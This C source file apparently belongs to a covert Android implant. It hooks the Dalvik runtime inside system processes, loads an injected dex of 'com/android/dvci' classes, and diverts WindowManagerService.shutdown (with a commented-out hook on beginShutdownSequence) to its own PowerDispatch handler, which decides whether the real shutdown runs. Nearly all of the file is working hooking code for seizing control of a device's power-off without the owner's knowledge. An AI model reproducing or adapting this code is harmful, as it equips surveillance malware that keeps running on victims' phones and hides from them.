#include "hook.h"
#include "dexstuff.h"
#include "dalvik_hook.h"
#include "extern.h"
#include "base.h"
#include "common.h"


static char *classes[] = {
         "com/android/dvci/event/LowEvent/PowerDispatch",
         "com/android/dvci/event/LowEvent/PowerEvent",
         "com/android/dvci/util/Reflect",
         "com/android/dvci/util/LowEventMsg",
         "com/android/dvci/util/ReflectException",
         "com/android/dvci/auto/Cfg",
         "com/android/dvci/file/AutoFile",
         "com/android/dvci/file/Path",
         "com/android/dvci/util/Check",
         "com/android/dvci/util/DateTime",
         "com/android/dvci/util/Utils",
         "android/content/Context",
         NULL };

static char createcnf = 0;

static struct dalvik_hook_t beginShutdownSequence;
static struct dalvik_cache_t beginShutdownSequence_cache;

//private static void beginShutdownSequence(Context context)
static void beginShutdownSequence_fnc(JNIEnv *env, jobject this,jobject context);


static struct dalvik_hook_t windowManager_shutdown;
static struct dalvik_cache_t windowManager_shutdown_cache;
//public void shutdown(boolean confirm)
static void windowManager_shutdown_fnc(JNIEnv *env, jobject this,jboolean confirm);

int instrument_power(){
   log("instrument power dumpDir=%s\n",dumpDir);
   char *cmdline = who_am_i(64);
   int exit=0;
   if(cmdline && dex){
      if( strcasestr(cmdline,"<pre-initialized>")!=NULL ){
         //do not instrument cmdline is still undefined
         exit=-1;
      }else if( strcasestr(cmdline,dumpDir)!=NULL ){
         //do not instrument dex process itself
         exit=1;
      }
   }
   if(cmdline){
        free(cmdline);
        cmdline = NULL;
   }
   if(exit){
      log("instrument power skipping myself or zygote exit=%d\n",exit);
      return exit;
   }
   // resolve symbols from DVM if needed
   if(d.dvm_hand==NULL){
      dexstuff_resolv_dvm(&d);
   }

/*
   dalvik_hook_setup(&beginShutdownSequence, "Lcom/android/server/power/ShutdownThread;", "beginShutdownSequence", "(Landroid/content/Context;)V", 2, beginShutdownSequence_fnc);
     if (dalvik_hook(&d, &beginShutdownSequence)) {
        log("my_epoll_wait: hook beginShutdownSequence ok\n");
        if(dumpDir!=NULL){
           create_cnf("pw.cnf");
        }
     } else {
        log("my_epoll_wait: hook beginShutdownSequence fails\n");
     }

   beginShutdownSequence_cache.cls_h = NULL;
   beginShutdownSequence_cache.mid_h = NULL;
*/

   dalvik_hook_setup(&windowManager_shutdown, "Lcom/android/server/wm/WindowManagerService;", "shutdown", "(Z)V", 2, windowManager_shutdown_fnc);
       if (dalvik_hook(&d, &windowManager_shutdown)) {
          log("my_epoll_wait: hook shutdown ok\n");
          if(dumpDir!=NULL){
             create_cnf("pw.cnf");
          }
       } else {
          log("my_epoll_wait: hook shutdown fails\n");
       }

   windowManager_shutdown_cache.cls_h = NULL;
   windowManager_shutdown_cache.mid_h = NULL;


   return exit;

}

static void beginShutdownSequence_fnc(JNIEnv *env, jobject this, jobject context)
{
   int go_ahead=1;
   dalvik_prepare(&d, &beginShutdownSequence, env);
     if (beginShutdownSequence_cache.cls_h == 0) {
        if (load_dext(dex, classes)) {
           log("failed to load class ");
           go_ahead = 0;
        }
     } else {
      log("using cache");
    }

     if (go_ahead) {
        if (beginShutdownSequence_cache.cls_h == 0) {
           log("beginShutdownSequence_fnc \n")
      beginShutdownSequence_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/LowEvent/PowerDispatch");
        }
        if (beginShutdownSequence_cache.cls_h != 0) {
           if (beginShutdownSequence_cache.mid_h == 0) {
              beginShutdownSequence_cache.mid_h = (*env)->GetStaticMethodID(env, beginShutdownSequence_cache.cls_h, "beginShutdownSequence", "(Ljava/lang/Object;Landroid/content/Context;)V");
           }
           if (beginShutdownSequence_cache.mid_h) {
              (*env)->CallStaticVoidMethod(env, beginShutdownSequence_cache.cls_h, beginShutdownSequence_cache.mid_h,this,context);
           } else {
              log("method not found!\n")
           }
        } else {
           log("com/android/dvci/event/LowEvent/PowerDispatch not found!\n")
        }
     }


   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!! call original");
      (*env)->ExceptionClear(env);
      (*env)->CallVoidMethod(env, this, beginShutdownSequence.mid,context);
      log("success calling : %s\n", beginShutdownSequence.method_name)

   }
   dalvik_postcall(&d, &beginShutdownSequence);
   return;
}

static void windowManager_shutdown_fnc(JNIEnv *env, jobject this, jboolean confirm)
{
   int go_ahead=1;
   int res = RES_DO_NOTHING;
   dalvik_prepare(&d, &windowManager_shutdown, env);
     if (windowManager_shutdown_cache.cls_h == 0) {
        if (load_dext(dex, classes)) {
           log("failed to load class ");
           go_ahead = 0;
        }
     } else {
      log("using cache");
    }

     if (go_ahead) {
        if (windowManager_shutdown_cache.cls_h == 0) {
           log("windowManager_shutdown \n")
            windowManager_shutdown_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/LowEvent/PowerDispatch");
        }
        if (windowManager_shutdown_cache.cls_h != 0) {
           if (windowManager_shutdown_cache.mid_h == 0) {
              windowManager_shutdown_cache.mid_h = (*env)->GetStaticMethodID(env, windowManager_shutdown_cache.cls_h, "windowManager_shutdown", "(Ljava/lang/Object;Z)I");
           }
           if (windowManager_shutdown_cache.mid_h) {
              res = (*env)->CallStaticIntMethod(env, windowManager_shutdown_cache.cls_h, windowManager_shutdown_cache.mid_h,this,confirm);
           } else {
              log("method not found!\n")
           }
        } else {
           log("com/android/dvci/event/LowEvent/PowerDispatch not found!\n")
        }
     }


   if ((*env)->ExceptionOccurred(env) || res == RES_DO_NOTHING) {
      log("got an exception!! call original");
      (*env)->ExceptionClear(env);
      (*env)->CallVoidMethod(env, this, windowManager_shutdown.mid,confirm);
      log("success calling : %s\n", windowManager_shutdown.method_name)

   }
   dalvik_postcall(&d, &windowManager_shutdown);
   return;
}
